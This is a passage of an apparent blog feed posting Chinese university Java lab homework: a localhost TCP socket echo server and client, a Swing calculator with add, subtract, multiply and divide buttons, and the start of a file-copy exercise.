= br.readLine();</span><br><span class="line"> &#125;</span><br><span class="line"> br.close();</span><br><span class="line"> isr.close();</span><br><span class="line"> is.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">&#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag==<span class="keyword">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"含有"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">System.out.println(<span class="string">"不含有"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/laF4Vs.png" alt="laF4Vs.png"></p><h3 id="五、"><a href="#五、" class="headerlink" title="五、"></a>五、</h3><p>编写一个基于TCP的Socket程序，服务器向客户端发送一个字符串：”Socket你好!”，客户端将接收到的字符串输出到屏幕。在一台PC上测试该程序。</p><p>编写一个基于TCP的Socket程序，服务器向客户端发送一个字符串：”Socket你好!”，客户端将接收到的字符串输出到屏幕。在两台PC之间测试该程序。（本题上机时两人一组，一个作为服务方，另一个作为客户方，然后两人之间进行对话）</p><p>编写一个Socket网络通讯应用程序，实现如下功能：</p><p> 1）客户端能够发任意的信息给服务器端；</p><p> 2）服务器端将收到的客户端信息返还给客户端。</p><p> 把3个合在一起</p><p>服务器端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.net.ServerSocket;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">sever</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 构造服务器ServerSocket对象</span></span><br><span class="line">            ServerSocket ss = <span class="keyword">new</span> ServerSocket(<span class="number">30102</span>);</span><br><span class="line">            System.out.println(<span class="string">"服务器准备就绪！"</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">                Socket s = ss.accept();</span><br><span class="line">                <span class="comment">// 线程</span></span><br><span class="line">                <span class="keyword">new</span> ServerThread(s).start();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 服务器端与客户端会话的线程</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServerThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Socket s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> BufferedReader read = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> PrintStream print = <span class="keyword">null</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ServerThread</span><span class="params">(Socket s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.s = s;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">            read = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(s.getInputStream()));</span><br><span class="line">            print = <span class="keyword">new</span> PrintStream(s.getOutputStream());</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 线程的运行run方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String message = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">while</span> (!(message = read.readLine()).equals(<span class="string">"exit"</span>))&#123;</span><br><span class="line">                </span><br><span class="line">            System.out.println(<span class="string">"client发送："</span>+message);</span><br><span class="line">                print.println(<span class="string">"Socket你好!"</span> + message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(!s.isClosed())&#123;</span><br><span class="line">                    </span><br><span class="line">                    s.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw6;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"><span class="keyword">import</span> java.net.UnknownHostException;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 构造与服务器通讯的Socket对象</span></span><br><span class="line">            Socket s = <span class="keyword">new</span> Socket(<span class="string">"127.0.0.1"</span>, <span class="number">30102</span>);</span><br><span class="line">            <span class="comment">// 启动一个线程与服务器通讯</span></span><br><span class="line">            <span class="keyword">new</span> LinkThread(s).start();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">  </span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 与服务器通讯的线程</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LinkThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Socket s = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> PrintStream out = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> BufferedReader in = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> Scanner scanner = <span class="keyword">null</span>;</span><br><span class="line">   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkThread</span><span class="params">(Socket s)</span> </span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">this</span>.s = s;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">            out = <span class="keyword">new</span> PrintStream(s.getOutputStream());</span><br><span class="line">            in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(s.getInputStream()));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (UnknownHostException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 线程的运行run方法</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        System.out.println(<span class="string">"提示：如果要结束本次会话，请输入“exit”指令！"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">                System.out.print(<span class="string">"请输入："</span>);</span><br><span class="line">                String message = scanner.nextLine();</span><br><span class="line">                out.println(message);</span><br><span class="line">                out.flush();</span><br><span class="line">                String str = in.readLine();</span><br><span class="line">                <span class="keyword">if</span>(str != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    System.out.println(str);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.println(<span class="string">"本次会话结束！"</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(!s.isClosed())&#123;</span><br><span class="line">                    s.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/lakCRK.png" alt="lakCRK.png"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;java第四次实验作业。&lt;/p&gt;
    
    </summary>
    
    
      <category term="java" scheme="https://1187100546.github.io/categories/java/"/>
    
    
      <category term="java" scheme="https://1187100546.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>java第三次实验作业</title>
    <link href="https://1187100546.github.io/2020/01/03/java-3/"/>
    <id>https://1187100546.github.io/2020/01/03/java-3/</id>
    <published>2020-01-03T08:02:06.000Z</published>
    <updated>2020-01-03T08:18:28.806Z</updated>
    
    <content type="html"><![CDATA[<p>Java第三次实验作业。</p><a id="more"></a><h3 id="一、"><a href="#一、" class="headerlink" title="一、"></a>一、</h3><p>开发一个加、减、乘、除四则运算器。用户界面如下图：</p><p><img src="https://s2.ax1x.com/2020/01/03/laCkAx.png" alt="laCkAx.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hw5;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.border.EmptyBorder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javafx.event.ActionEvent;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jsq</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> JPanel contentPane;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> JTextField textField;</span><br><span class="line"><span class="keyword">private</span> JTextField textField_1;</span><br><span class="line"><span class="keyword">private</span> JTextField textField_2;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Launch the application.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">EventQueue.invokeLater(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">jsq frame = <span class="keyword">new</span> jsq();</span><br><span class="line">frame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Create the frame.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">jsq</span><span class="params">()</span> </span>&#123;</span><br><span class="line">setFont(<span class="keyword">new</span> Font(<span class="string">"幼圆"</span>, Font.BOLD, <span class="number">20</span>));</span><br><span class="line">setForeground(<span class="keyword">new</span> Color(<span class="number">153</span>, <span class="number">50</span>, <span class="number">204</span>));</span><br><span class="line">setTitle(<span class="string">"\u8BA1\u7B97\u5668"</span>);</span><br><span class="line">setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);</span><br><span class="line">setBounds(<span class="number">100</span>, <span class="number">100</span>, <span class="number">450</span>, <span class="number">300</span>);</span><br><span class="line">contentPane = <span class="keyword">new</span> JPanel();</span><br><span class="line">contentPane.setBorder(<span class="keyword">new</span> EmptyBorder(<span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">5</span>));</span><br><span class="line">setContentPane(contentPane);</span><br><span class="line">contentPane.setLayout(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">textField = <span class="keyword">new</span> JTextField();</span><br><span class="line">textField.setBounds(<span class="number">0</span>, <span class="number">0</span>, <span class="number">432</span>, <span class="number">56</span>);</span><br><span class="line">contentPane.add(textField);</span><br><span class="line">textField.setColumns(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">textField_1 = <span class="keyword">new</span> JTextField();</span><br><span class="line">textField_1.setBounds(<span class="number">0</span>, <span class="number">67</span>, <span class="number">432</span>, <span class="number">56</span>);</span><br><span class="line">contentPane.add(textField_1);</span><br><span class="line">textField_1.setColumns(<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">JButton btnNewButton = <span class="keyword">new</span> JButton(<span class="string">"+"</span>);</span><br><span class="line">btnNewButton.setFont(<span class="keyword">new</span> Font(<span class="string">"幼圆"</span>, Font.BOLD, <span class="number">16</span>));</span><br><span class="line">btnNewButton.setForeground(<span class="keyword">new</span> Color(<span class="number">50</span>, <span class="number">205</span>, <span class="number">50</span>));</span><br><span class="line">btnNewButton.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(java.awt.event.ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">double</span> x = Double.parseDouble(textField.getText());</span><br><span class="line">                <span class="keyword">double</span> y = Double.parseDouble(textField_1.getText());</span><br><span class="line">                <span class="keyword">double</span> z = x+y;</span><br><span class="line">                <span class="keyword">if</span>(z - (<span class="keyword">int</span>)z &lt;= <span class="number">0.00001</span>) textField_2.setText(Integer.toString((<span class="keyword">int</span>)z));</span><br><span class="line">                <span class="keyword">else</span> textField_2.setText(Double.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">btnNewButton.setBounds(<span class="number">0</span>, <span class="number">122</span>, <span class="number">103</span>, <span class="number">54</span>);</span><br><span class="line">contentPane.add(btnNewButton);</span><br><span class="line"></span><br><span class="line">JButton btnNewButton_1 = <span class="keyword">new</span> JButton(<span class="string">"-"</span>);</span><br><span class="line">btnNewButton_1.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(java.awt.event.ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">double</span> x = Double.parseDouble(textField.getText());</span><br><span class="line">                <span class="keyword">double</span> y = Double.parseDouble(textField_1.getText());</span><br><span class="line">                <span class="keyword">double</span> z = x-y;</span><br><span class="line">                <span class="keyword">if</span>(z - (<span class="keyword">int</span>)z &lt;= <span class="number">0.00001</span>) textField_2.setText(Integer.toString((<span class="keyword">int</span>)z));</span><br><span class="line">                <span class="keyword">else</span> textField_2.setText(Double.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">btnNewButton_1.setFont(<span class="keyword">new</span> Font(<span class="string">"幼圆"</span>, Font.BOLD, <span class="number">20</span>));</span><br><span class="line">btnNewButton_1.setForeground(<span class="keyword">new</span> Color(<span class="number">255</span>, <span class="number">69</span>, <span class="number">0</span>));</span><br><span class="line">btnNewButton_1.setBounds(<span class="number">115</span>, <span class="number">122</span>, <span class="number">103</span>, <span class="number">54</span>);</span><br><span class="line">contentPane.add(btnNewButton_1);</span><br><span class="line"></span><br><span class="line">JButton btnNewButton_2 = <span class="keyword">new</span> JButton(<span class="string">"*"</span>);</span><br><span class="line">btnNewButton_2.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(java.awt.event.ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">double</span> x = Double.parseDouble(textField.getText());</span><br><span class="line">                <span class="keyword">double</span> y = Double.parseDouble(textField_1.getText());</span><br><span class="line">                <span class="keyword">double</span> z = x*y;</span><br><span class="line">                <span class="keyword">if</span>(z - (<span class="keyword">int</span>)z &lt;= <span class="number">0.00001</span>) textField_2.setText(Integer.toString((<span class="keyword">int</span>)z));</span><br><span class="line">                <span class="keyword">else</span> textField_2.setText(Double.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">btnNewButton_2.setFont(<span class="keyword">new</span> Font(<span class="string">"幼圆"</span>, Font.BOLD, <span class="number">20</span>));</span><br><span class="line">btnNewButton_2.setForeground(<span class="keyword">new</span> Color(<span class="number">255</span>, <span class="number">215</span>, <span class="number">0</span>));</span><br><span class="line">btnNewButton_2.setBounds(<span class="number">218</span>, <span class="number">122</span>, <span class="number">103</span>, <span class="number">54</span>);</span><br><span class="line">contentPane.add(btnNewButton_2);</span><br><span class="line"></span><br><span class="line">JButton btnNewButton_3 = <span class="keyword">new</span> JButton(<span class="string">"/"</span>);</span><br><span class="line">btnNewButton_3.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(java.awt.event.ActionEvent e)</span> </span>&#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line"><span class="keyword">double</span> x = Double.parseDouble(textField.getText());</span><br><span class="line">                <span class="keyword">double</span> y = Double.parseDouble(textField_1.getText());</span><br><span class="line">                <span class="keyword">double</span> z = x/y;</span><br><span class="line">                <span class="keyword">if</span>(z - (<span class="keyword">int</span>)z &lt;= <span class="number">0.00001</span>) textField_2.setText(Integer.toString((<span class="keyword">int</span>)z));</span><br><span class="line">                <span class="keyword">else</span> textField_2.setText(Double.toString(z));</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">btnNewButton_3.setFont(<span class="keyword">new</span> Font(<span class="string">"幼圆"</span>, Font.BOLD, <span class="number">20</span>));</span><br><span class="line">btnNewButton_3.setForeground(<span class="keyword">new</span> Color(<span class="number">0</span>, <span class="number">191</span>, <span class="number">255</span>));</span><br><span class="line">btnNewButton_3.setBounds(<span class="number">329</span>, <span class="number">122</span>, <span class="number">103</span>, <span class="number">54</span>);</span><br><span class="line">contentPane.add(btnNewButton_3);</span><br><span class="line"></span><br><span class="line">textField_2 = <span class="keyword">new</span> JTextField();</span><br><span class="line">textField_2.setBounds(<span class="number">0</span>, <span class="number">187</span>, <span class="number">442</span>, <span class="number">58</span>);</span><br><span class="line">contentPane.add(textField_2);</span><br><span class="line">textField_2.setColumns(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/01/03/laCr5V.png" alt="laCr5V.png"></p><h3 id="二、"><a href="#二、" class="headerlink" title="二、"></a>二、</h3><p>编写一个程序，实现文件内容拷贝，具体过程如下：</p><p> 1) 建一文件myfile1.txt，写入内容“I am a student.”；</p><p> 2) 打开文件myfile1.txt，读出内容放入字符数组中；</p><p> 3) 再建一文件myfile2.txt，将字符数组中内容写入；</p><p> 4) 打开文件myfile2.txt，读出内容输出到屏幕。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 